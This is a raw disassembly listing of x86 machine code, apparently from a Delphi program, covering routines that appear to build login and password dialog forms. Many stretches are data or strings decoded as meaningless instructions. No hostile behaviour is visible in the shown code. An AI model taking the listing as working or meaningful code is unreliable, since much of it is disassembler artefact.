add [ fs : ecx + eax * 2 + 0x48 ] ch
add [ edi ] cl
or cl [ ecx + 0x44 ]
inc edx
push ebx
jae r-xdata
add al 0xe8
jmp sub_405adc
imul ebp [ edi + 0x6e ] r-xdata
add ebx edi
dec eax
and al 0xcc
jb r-xdata
add [ eax ] al
add bh bh
mov [ 0x77f7934b ] al

sub_484193
dec esp
add eax 0xffffffec
jmp r-xdata
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x10 ]
call sub_403ff8
pop esi
pop ebx
retn
sub_4841fa
lodsd [ esi ]
inc ecx
dec eax
add [ edi - 0x3effb7bf ] dh
inc ecx
dec eax
add [ ebp - 0x62ffb7bf ] dl
inc ecx
dec eax
add [ ebp - 0x24ffb7bf ] ah
inc ecx
dec eax
add ch ah
inc ecx
dec eax
add bh ch
inc ecx
dec eax
add bl cl
inc ecx
dec eax
add bl dl
inc ecx
dec eax
add [ edx ] al
add [ eax ] al
add [ esi - 0x21 ] dh
mov al [ 0xffffffffaaec6afa ]
dec eax
xchg edi eax
push esp
sub eax 0x5c81df36
or eax sub_4841fa
adc al 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
or ch al
mov eax [ 0xffffffffcd6adc29 ]
inc esp
mov dh bl
dec edi
push ecx
mov dl 0x5d
pop ecx
xchg ebp eax
adc al [ edx + 0x48 ]
add [ eax ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + 0x4842b0c0 ] cl
add [ esi ] ah
inc edx
dec eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x4842 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add dl al
inc edx
dec eax
add [ eax + eax ] bl
add [ eax ] al
adc al [ fs : eax ]
pushfd
xor al 0x40
add [ eax - 0x6bffbfa6 ] cl
pop edx
inc eax
add [ eax - 0x5bffbfcc ] dh
xor al 0x40
add [ edx + ebx * 2 + 0x32080040 ] ah
inc eax
add [ edx + esi + 0x40 ] al
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ ecx + edx ] al
inc eax
add [ eax ] dl
add [ eax ] al
add [ ebx ] bl
push esp
inc esp
popa
jne r-xdata
je r-xdata
pop esi
pop ebx
retn
inc edx
push ebx
arpl [ edx + 0x65 ] si
outsb
inc ecx
jo r-xdata
mov ecx 0x26
mov edx [ r-xdata ]
call sub_404a58
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48436b
retn
insb
imul esp [ ebx + 0x61 ] 0x6e6f6974
mov eax eax
mov al [ eax + 0xc ]
retn
sub_484370
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4843d1
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4843d8
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403224
mov edx eax
test edx edx
je r-xdata
mov eax rw-data
mov ecx r-xdata
call sub_405a4c
mov eax rw-data
mov edx [ rw-data ]
mov ecx r-xdata
call sub_405a4c
sub edx 0xfffffff8
sub_484401
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add al al
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add cl al
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add dl al
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add bl al
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add ah al
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add ch al
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add dh al
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add bh al
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add al cl
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add cl cl
inc [ eax ]
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_484479
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_484480
retn
sub_48448c
fadd [ eax + ecx * 2 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
lodsb [ esi ]
inc esi
dec eax
add ah cl
inc ebp
dec eax
add [ ecx + 0x46 ] dh
dec eax
add [ eax ] al
add [ eax ] al
add [ edx + 0x24004846 ] al
add eax [ eax ]
add [ esi + eax ] dl
inc esi
add [ edi + eax ] dh
inc edx
add [ eax + 0x5c004634 ] ch
inc esi
add [ eax - 0x37ffbfcc ] dh
pop edx
inc esi
add ah ch
xor [ eax ] eax
or [ edx ] dh
inc eax
add ah al
inc esi
add al dh
adc al [ ebp ]
xor al 0x3c
inc esi
add al cl
stosd [ edi ]
inc ecx
add [ eax + edi + 0x38c00046 ] al
inc esi
add ah cl
cmp [ esi ] eax
mov al [ 0x4c00449d ]
pop es
inc edx
add [ edx + eax * 2 + 0x46 ] al
add [ esp + eax ] ch
inc edx
add ah ah
jge r-xdata
mov al [ 0x42840044 ]
inc esi
add ah dh
retn 0x44
add [ ebx + esi ] bl
inc esi
add [ esi + ecx ] al
inc ebp
add [ eax ] ah
adc eax [ ebp ]
insb
adc al [ ebp ]
cld
xchg edx eax
inc esp
add [ eax + 0x24004508 ] al
aas
inc esi
add [ eax + 0x44004505 ] al
xchg edx eax
inc esp
add [ eax - 0x6e ] cl
inc esp
add [ eax ] bl
inc eax
inc esi
add [ eax - 0x3e ] dh
inc esp
add [ eax - 0x3fffbb63 ] cl
xchg ebx eax
inc esp
add [ edi + ebx * 4 ] dl
inc esp
add [ edx + eax * 2 ] cl
inc esi
add al bl
inc eax
inc esi
add [ eax + 0x44 ] cl
add [ edx + eax * 2 - 0x3d0bffba ] al
inc esp
add [ esi + eax ] cl
inc ebp
add al cl
push es
inc ebp
add [ ecx + eax + 0x6ac0045 ] cl
inc ebp
add [ ecx + esi ] ah
inc esi
add [ eax ] ch
dec ecx
inc esi
add [ eax - 0x24 ] al
inc esp
add ah ch
push ebp
inc esi
add [ ecx + ebx * 2 + 0x46 ] cl
add [ eax ] cl
pop eax
inc esi
add al bl
fadd [ eax + eax - 0x24 ]
fadd [ eax + eax - 0x7c ]
pop edx
inc esi
add [ ebx + ebx * 8 ] bh
inc esp
add ah ch
pop es
inc ebp
add [ eax + 0x61 ] bh
inc esi
add al ah
sbb [ ebp ] eax
xor [ eax * 2 + 0x46768c00 ] al
add [ eax ] bl
sub eax [ esi ]
enter 0x462d 0x0
insb
inc esi
add [ eax + 0x24004637 ] ch
cmp [ esi ] al
insb
jpe r-xdata
add al 0x3
add al ah
xor al 0x46
add [ eax + 0x75 ] dh
inc esi
add [ eax + 0x5c ] dl
inc esi
add [ edi + esi * 2 ] ah
inc esi
add [ eax ] cl
inc edx
inc esi
add [ ebx ] cl
add [ edi - 0x7ffb7ba ] cl
add al [ eax ]
add [ eax ] al
add [ 0x656e6150 ] al
insb
cld
add al [ eax ]
add [ ecx ] al
add [ 0x65766542 ] al
insb
add [ ebx ] al
add [ eax ] al
add al [ eax ]
or al 0x44
popad
je r-xdata
insd
je r-xdata
add [ eax + eax ] al
add [ eax ] al
add eax [ eax ]
or [ edi + 0x4b ] cl
inc edx
jne r-xdata
bound esp [ ecx + 0x73 ]
dec esi
popad
insd
add al 0x3
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0xec ]
dec eax
jne r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x320 ]
mov eax [ ebp - 0x8 ]
call sub_465b2c
inc esi
outsd
jb r-xdata
outsb
or [ ebx ] al
add [ eax ] al
add eax [ eax ]
or al 0x43
popad
outsb
arpl [ ebp + 0x6c ] sp
inc edx
jne r-xdata
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ebx
mov edi ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_4847d4
push [ fs : eax ]
ja r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4847b9
mov eax [ ebp - 0x8 ]
call sub_403254
retn
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x320 ]
call sub_449fb8
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_403ff8
lea edx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x31c ]
call sub_449fb8
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_403ff8
mov [ ebp - 0x1 ] 0x1
mov [ fs : eax ] esp
mov ecx [ rw-data ]
mov ecx [ ecx ]
mov dl 0x1
mov eax [ sub_48448c ]
call sub_46331c
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4847b2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x300 ]
mov edx esi
call sub_449fe8
mov edx [ ebx ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x320 ]
call sub_449fe8
mov [ ebp - 0x1 ] 0x0
cmp [ ebx ] 0x0
jne r-xdata
aam 0x47
dec eax
add [ edi + edi * 8 + 0x30 ] ah
push ebx
push 0x540c776f
dec esp
outsd
imul ebp [ bp + 0x44 ] 0x6f6c6169
add [ eax ] dh
and eax [ ebx ]
or [ esi - 0x2cf7ffbd ] bh
inc ebx
add [ esi + eax * 8 + 0x408d0043 ] ah
add [ esi + eax * 2 + 0xc070048 ] ch
push esp
dec esp
outsd
imul ebp [ bp + 0x44 ] 0x6f6c6169
fadd [ si + 0x48 ]
add ah bl
daa
inc ebx
je r-xdata
nop
push ebp
jb r-xdata
add eax 0x4327dc00
outsd
or [ eax + 0x61 ] dl
jae r-xdata
outsb
or al 0x3
add [ eax ] al
add [ eax ] al
push es
push eax
popad
outsb
insb
xor [ eax ] edx
add eax [ eax ]
add [ edx ] al
add [ esi ] al
dec esp
popad
bound esp [ ebp + 0x6c ]
xor [ ebx + eax ] edx
add [ eax ] al
add al [ eax ]
push es
dec esp
popad
bound esp [ ebp + 0x6c ]
xor bl [ eax ]
add eax [ eax ]
add [ edx ] al
add [ esi ] al
dec esp
popad
bound esp [ ebp + 0x6c ]
xor ebx [ ebx + eax ]
add [ eax ] al
add al 0x0
outsd
inc esp
insb
add [ bx + si ] al
inc edx
dec esp
and [ ebx ] al
add [ eax ] al
add al 0x0
or [ ebp + 0x73 ] dl
jb r-xdata
add [ edi + eax + 0x46 ] bl
add [ esi ] bl
or [ edx + eax * 2 + 0x4c ] al
dec eax
popad
insd
add [ gs : eax ] eax
ltr ax
dec edx
dec eax
add [ eax ] cl
sub_4847e8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ebx
mov edi ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_484904
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ rw-data ]
mov ecx [ ecx ]
mov dl 0x1
mov eax [ sub_48448c ]
call sub_46331c
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4848e2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x300 ]
mov edx esi
call sub_449fe8
mov edx [ ebx ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x320 ]
call sub_449fe8
mov [ ebp - 0x1 ] 0x0
cmp [ ebp + 0x8 ] 0x0
je r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x320 ]
xor edx edx
mov ecx [ eax ]
call [ ecx + 0x64 ]
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0xec ]
dec eax
jne r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x320 ]
mov eax [ ebp - 0x8 ]
call sub_465b2c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4848e9
mov eax [ ebp - 0x8 ]
call sub_403254
retn
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x320 ]
call sub_449fb8
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_403ff8
lea edx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x31c ]
call sub_449fb8
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_403ff8
mov [ ebp - 0x1 ] 0x1
sub_484918
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_484ac6
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ rw-data ]
mov ecx [ ecx ]
mov dl 0x1
mov eax [ sub_48448c ]
call sub_46331c
mov [ ebp - 0x8 ] eax
xor edx edx
push ebp
push sub_484a9c
push [ fs : edx ]
mov [ fs : edx ] esp
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405ecc
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_449fe8
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x2fc ]
xor edx edx
call sub_449ed8
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x300 ]
xor edx edx
call sub_449ed8
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x318 ]
xor edx edx
call sub_449ed8
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x2f8 ]
mov edx [ eax + 0x4c ]
mov ecx [ ebp - 0x8 ]
mov ecx [ ecx + 0x2fc ]
sub edx [ ecx + 0x44 ]
call sub_449798
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x304 ]
mov edx [ eax + 0x44 ]
mov ecx [ ebp - 0x8 ]
mov ecx [ ecx + 0x2fc ]
sub edx [ ecx + 0x44 ]
call sub_44974c
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x308 ]
mov edx [ eax + 0x44 ]
mov ecx [ ebp - 0x8 ]
mov ecx [ ecx + 0x2fc ]
sub edx [ ecx + 0x44 ]
call sub_44974c
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x4c ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x2fc ]
sub edx [ eax + 0x44 ]
mov eax [ ebp - 0x8 ]
call sub_449798
mov edx [ ebx ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x320 ]
call sub_449fe8
mov [ ebp - 0x1 ] 0x0
cmp [ ebx ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0xec ]
dec eax
jne r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x320 ]
mov eax [ ebp - 0x8 ]
call sub_465b2c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_484aa3
mov eax [ ebp - 0x8 ]
call sub_403254
retn
lea edx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x320 ]
call sub_449fb8
mov edx [ ebp - 0x10 ]
mov eax ebx
call sub_403ff8
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x31c ]
call sub_449fb8
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_403ff8
mov [ ebp - 0x1 ] 0x1
sub_484ad8
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x2f8 ]
call sub_4499bc
mov esi [ ebx + 0x300 ]
mov edx [ esi + 0x48 ]
add edx [ esi + 0x40 ]
cmp eax edx
jg r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x2f8 ]
call sub_4499bc
mov edx eax
mov eax [ ebx + 0x300 ]
sub edx [ eax + 0x40 ]
sub edx 0x5
mov eax [ ebx + 0x300 ]
call sub_449774
sub_484b30
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_484b55
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_484b5c
retn
sub_484b60
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov [ eax ] r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov [ eax ] sub_4847e8
mov eax [ rw-data ]
mov [ eax ] sub_484b20
mov eax [ rw-data ]
mov [ eax ] sub_484918
sub_484bc1
dec esp
dec eax
add [ esi + ecx * 2 ] dl
dec eax
add [ esi ] al
dec ebp
dec eax
add [ edx + 0x484d ] al
add [ eax ] al
add cl dh
dec ebp
dec eax
add [ ebx + eax ] bl
add [ eax ] al
adc al 0x6
inc esi
add [ edi + eax ] dh
inc edx
add [ eax + 0x5c004634 ] ch
inc esi
add [ eax - 0x37ffbfcc ] dh
pop edx
inc esi
add ah ch
xor [ eax ] eax
or [ edx ] dh
inc eax
add ah al
inc esi
add al dh
adc al [ ebp ]
xor al 0x3c
inc esi
add al cl
stosd [ edi ]
inc ecx
add [ eax + edi + 0x38c00046 ] al
inc esi
add ah cl
cmp [ esi ] eax
mov al [ 0x4c00449d ]
pop es
inc edx
add [ edx + eax * 2 + 0x46 ] al
add [ esp + eax ] ch
inc edx
add ah ah
jge r-xdata
mov al [ 0x42840044 ]
inc esi
add ah dh
retn 0x44
add [ ebx + esi ] bl
inc esi
add [ esi + ecx ] al
inc ebp
add [ eax ] ah
adc eax [ ebp ]
insb
adc al [ ebp ]
cld
xchg edx eax
inc esp
add [ eax + 0x24004508 ] al
aas
inc esi
add [ eax + 0x44004505 ] al
xchg edx eax
inc esp
add [ eax - 0x6e ] cl
inc esp
add [ eax ] bl
inc eax
inc esi
add [ eax - 0x3e ] dh
inc esp
add [ eax - 0x3fffbb63 ] cl
xchg ebx eax
inc esp
add [ edi + ebx * 4 ] dl
inc esp
add [ edx + eax * 2 ] cl
inc esi
add al bl
inc eax
inc esi
add [ eax + 0x44 ] cl
add [ edx + eax * 2 - 0x3d0bffba ] al
inc esp
add [ esi + eax ] cl
inc ebp
add al cl
push es
inc ebp
add [ ecx + eax + 0x6ac0045 ] cl
inc ebp
add [ ecx + esi ] ah
inc esi
add [ eax ] ch
dec ecx
inc esi
add [ eax - 0x24 ] al
inc esp
add ah ch
push ebp
inc esi
add [ ecx + ebx * 2 + 0x46 ] cl
add [ eax ] cl
pop eax
inc esi
add al bl
fadd [ eax + eax - 0x24 ]
fadd [ eax + eax - 0x7c ]
pop edx
inc esi
add [ ebx + ebx * 8 ] bh
inc esp
add ah ch
pop es
inc ebp
add [ eax + 0x61 ] bh
inc esi
add al ah
sbb [ ebp ] eax
xor [ eax * 2 + 0x46768c00 ] al
add [ eax ] bl
sub eax [ esi ]
enter 0x462d 0x0
insb
inc esi
add [ eax + 0x24004637 ] ch
cmp [ esi ] al
insb
jpe r-xdata
imul esi [ eax + eax + 0x3 ] 0x20000
or [ ecx + 0x64 ] eax
inc edx
add al ah
xor al 0x46
add [ eax + 0x75 ] dh
inc esi
add [ eax + 0x5c ] dl
inc esi
add [ edi + esi * 2 ] ah
inc esi
add [ eax ] cl
inc edx
inc esi
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + 0x41 ] ch
dec eax
add [ eax ] bl
add eax [ eax ]
add [ edi ] al
add [ ecx ] al
dec esi
dec eax
add al bh
add al [ eax ]
add [ eax ] al
add [ ecx ] cl
inc edi
jb r-xdata
arpl [ ebx + 0x18 ] bp
add [ eax + 0x1100484f ] dh
je r-xdata
add [ eax + 0xa00484e ] dh
jne r-xdata
outsd
inc edx
push edx
insd
outsd
jbe r-xdata
inc ebx
insb
imul esp [ ebx + 0x6b ] 0x4fb00018
outsb
add al 0x3
add [ eax ] al
add al [ eax ]
or al 0x52
insd
outsd
jbe r-xdata
push esp
push eax
popad
je r-xdata
inc ebp
imul esi [ fs : ebx + eax * 2 + 0x68 ] 0x65676e61
adc eax 0x484f3800
add [ esi ] cl
inc ecx
inc edx
jne r-xdata
dec eax
add [ edx ] cl
inc edx
outsd
js r-xdata
add [ eax + 0xf ] cl
xchg esp eax
inc ebp
push [ ebx ]
rcr [ edx + 0x59 ] 0x59
mov [ fs : eax ] edx
push sub_484ea6
mov eax [ ebp - 0x8 ]
call sub_403254
retn
inc esp
imul esp [ ecx + 0x6c ] 0x4c00676f
dec eax
add [ edi + eax + 0x46 ] bl
inc esp
inc edx
push eax
push edi
add [ edi ] al
je r-xdata
dec eax
add [ ecx ] dl
imul ebx [ eax ] 0x0
mov al 0x4f
inc edx
jne r-xdata
ja r-xdata
jae r-xdata
add [ edi ] al
outsb
add [ edx ] al
add [ edi ] cl
push edx
insd
jne r-xdata
cld
add al [ eax ]
add [ ecx ] al
add [ eax * 2 + 0x746964 ] al
add eax [ eax ]
add [ edx ] al
add [ ecx ] cl
inc ecx
inc edx
add [ esi ] bl
pop es
inc esi
outsb
inc ebx
insb
imul esp [ ebx + 0x6b ] 0x5020001b
dec eax
add [ edx + edx * 2 ] dl
insd
outsd
jbe r-xdata
outsd
je r-xdata
pop ecx
pop ecx
jb r-xdata
inc ecx
insb
insb
inc edx
jne r-xdata
inc esp
insb
add [ bx + si ] al
lea eax [ eax ]
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx eax
mov ecx [ rw-data ]
inc ecx
jne r-xdata
outsd
jbe r-xdata
outsb
or [ ebx ] al
add [ eax ] al
add al [ eax ]
rsqrtps xmm4 [ ebp + 0x6d ]
insb
inc edx
jne r-xdata
je r-xdata
dec ecx
add [ ebx - 0x5efe4df7 ] cl
mov ah 0x4b
dec eax
add al ch
retn
je r-xdata
insb
inc ecx
outsb
or al 0x3
add [ eax ] al
add al [ eax ]
or [ edi + 0x4b ] cl
inc edx
jne r-xdata
mov ecx [ ecx ]
mov dl 0x1
mov eax [ sub_484bb4 ]
call sub_46331c
mov [ ebp - 0x8 ] eax
xor eax eax
or eax rw-data
outsb
inc ebx
insb
imul esp [ ebx + 0x6b ] 0x50400014
dec eax
add [ 0x75424b4f ] cl
je r-xdata
push eax
je r-xdata
push ebp
outsd
outsb
inc ebx
insb
imul esp [ ebx + 0x6b ] 0x6150540f
adc al 0x0
inc eax
outsb
adc [ ebx ] al
add [ eax ] al
add al [ eax ]
or al 0x43
popad
outsb
arpl [ ebp + 0x6c ] sp
inc edx
jne r-xdata
mov eax [ ebp - 0x8 ]
add eax 0x318
mov edx ebx
call sub_405a20
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0xec ]
dec eax
sete [ ebp - 0x1 ]
xor eax eax
pop edx
ja r-xdata
jae r-xdata
push eax
popad
je r-xdata
mov [ eax ] esp
jb r-xdata
imul ecx [ edi ] 0x54
outsb
add eax 0xb0001100
dec esi
push sub_484e9f
push [ fs : eax ]
mov [ fs : eax ] esp
andps xmm2 [ eax + 0x61 ]
inc esp
imul esp [ ecx + 0x6c ] 0x3676f
dec esp
mov ch 0x43
add [ esi + eax * 8 - 0x2cf7ffbd ] ah
inc ebx
add [ eax + r-xdata ] dl
pop es
sub_484eb0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi eax
xor eax eax
push ebp
push sub_484f2a
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ esi + 0x2fc ]
call sub_449fb8
cmp [ ebp - 0x4 ] 0x0
setne bl
mov edx ebx
mov eax [ esi + 0x300 ]
mov ecx [ eax ]
call [ ecx + 0x64 ]
mov edx ebx
mov eax [ esi + 0x304 ]
mov ecx [ eax ]
call [ ecx + 0x64 ]
test bl bl
jne r-xdata
mov dl 0x1
cmp [ esi + 0x314 ] 0x0
jne r-xdata
xor edx edx
jmp r-xdata
mov eax [ esi + 0x30c ]
mov ecx [ eax ]
call [ ecx + 0x64 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_484f31
lea eax [ ebp - 0x4 ]
call sub_403fa4
retn
sub_484f38
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_484fa3
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x2fc ]
call sub_449fb8
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x318 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
mov [ ebx + 0x314 ] 0x1
mov eax [ ebx + 0x2fc ]
mov edx [ eax ]
call [ edx + 0xe0 ]
mov eax [ ebx + 0x2fc ]
mov edx [ eax ]
call [ edx + 0xc4 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_484faa
lea eax [ ebp - 0x4 ]
call sub_403fa4
retn
sub_484fb0
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_485014
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x2fc ]
call sub_449fb8
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x318 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov eax [ ebx + 0x2fc ]
mov edx [ eax ]
call [ edx + 0xe0 ]
mov eax [ ebx + 0x2fc ]
mov edx [ eax ]
call [ edx + 0xc4 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48501b
lea eax [ ebp - 0x4 ]
call sub_403fa4
retn
sub_485040
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_485088
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x2fc ]
call sub_449fb8
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x318 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48508f
lea eax [ ebp - 0x4 ]
call sub_403fa4
retn
sub_485094
push ebp
mov ebp esp
xor eax eax
push ebp
push j_sub_4039a8#9
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4850cb
retn
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
sub_48511f
add eax 0xfffffff0
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov ax [ eax + 0x44 ]
sub ax 0xffef
je r-xdata
mov al 0x2
retn
sub ax 0x6
je r-xdata
mov al 0x1
retn
sub ax 0xb
jne r-xdata
mov al 0x3
retn
xor eax eax
retn
sub_48526c
sub dl 0x1
jb r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
xor edx edx
call sub_468bf4
retn
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov dx 0xfff5
call sub_468bf4
retn
dec dl
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov dx 0xffef
call sub_468bf4
jmp r-xdata
retn
sub_4852bc
or al [ eax ]
add [ eax ] al
xchg esp eax
add [ ecx ] ecx
cmp al 0x6
dec ecx
add [ eax ] al
add [ eax ] al
add [ eax + 0x40004901 ] dl
add eax 0x49
add [ eax ] al
mov [ ecx ] es
dec ecx
add [ eax + 0x4904 ] cl
add [ eax ] al
add [ eax + 0x2c004901 ] cl
push es
dec ecx
add [ eax ] al
add [ eax ] al
add [ ecx + eax + 0x4b40049 ] al
dec ecx
add [ eax ] al
add [ eax ] al
add [ eax + 0x68004901 ] al
add ecx [ ecx ]
add [ eax ] al
add [ eax ] al
jl r-xdata
add [ eax + 0x3 ] al
dec ecx
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] bh
dec ecx
add [ eax ] ch
push es
dec ecx
add [ eax ] al
add [ eax ] al
add [ ecx + eax + 0x49 ] dh
add [ eax + 0x4 ] ch
dec ecx
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] dh
dec ecx
add [ edx + eax + 0x49 ] dl
add [ eax ] al
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push j_sub_4039a8#8
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
dec ecx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48537a
retn
mov eax [ rw-data ]
call sub_405a08
mov eax [ rw-data ]
call sub_405a08
sub_48537c
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax sub_4852bc
call sub_403d78
mov dl 0x1
mov eax [ r-xdata ]
call sub_403224
mov edx eax
test edx edx
je r-xdata
mov eax [ rw-data ]
mov ecx r-xdata
call sub_405a4c
mov eax [ rw-data ]
mov edx [ rw-data ]
mov edx [ edx ]
mov ecx r-xdata
call sub_405a4c
sub edx 0xfffffff8
sub_485424
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_485449
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_485450
retn
sub_48545c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_485481
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_485488
retn
